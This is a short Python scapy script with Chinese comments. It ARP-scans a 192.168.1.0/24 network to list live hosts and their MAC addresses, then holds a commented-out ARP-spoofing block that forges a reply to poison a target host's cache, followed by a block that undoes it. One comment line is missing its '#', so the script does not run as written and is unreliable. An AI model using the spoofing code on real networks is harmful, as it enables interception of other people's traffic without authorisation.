from scapy.all import *
print(show_interfaces())
wifi = 'Realtek Gaming GbE Family Controller'

# 模拟发包,向整个网络发包，如果有回应，则表示活跃的主机
p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='192.168.1.0/24')
# ans表示收到的包的回复
ans, unans = srp(p, iface=wifi, timeout=5)
print("一共扫描到%d台主机：" % len(ans))
# 将需要的IP地址和Mac地址存放在result列表中
result = []
for s, r in ans:
    # 解析收到的包，提取出需要的IP地址和MAC地址
    result.append([r[ARP].psrc, r[ARP].hwsrc])
# 将获取的信息进行排序，看起来更整齐一点
result.sort()
打印出局域网中的主机
for ip, mac in result:
    print(ip, '------>', mac)
# arp欺骗
# p =  ARP(
#     op=2,
#     hwsrc="f8:b4:6a:d8:b5:78",
#     hwdst="e0:dc:a0:30:5a:db",
#     psrc="192.168.1.3",
#     pdst="192.168.1.6"
#     )
# sr1(p)
# print("修改成功")
# time.sleep(10)
#恢复
# p =  ARP(# 代表ARP请求或者响应
#     op=2,
#     hwsrc="e0:dc:a0:36:c0:6d",
#     hwdst="e0:dc:a0:30:5a:db",
#     psrc="192.168.1.3",
#     pdst="192.168.1.6"
#     )
# sr1(p)
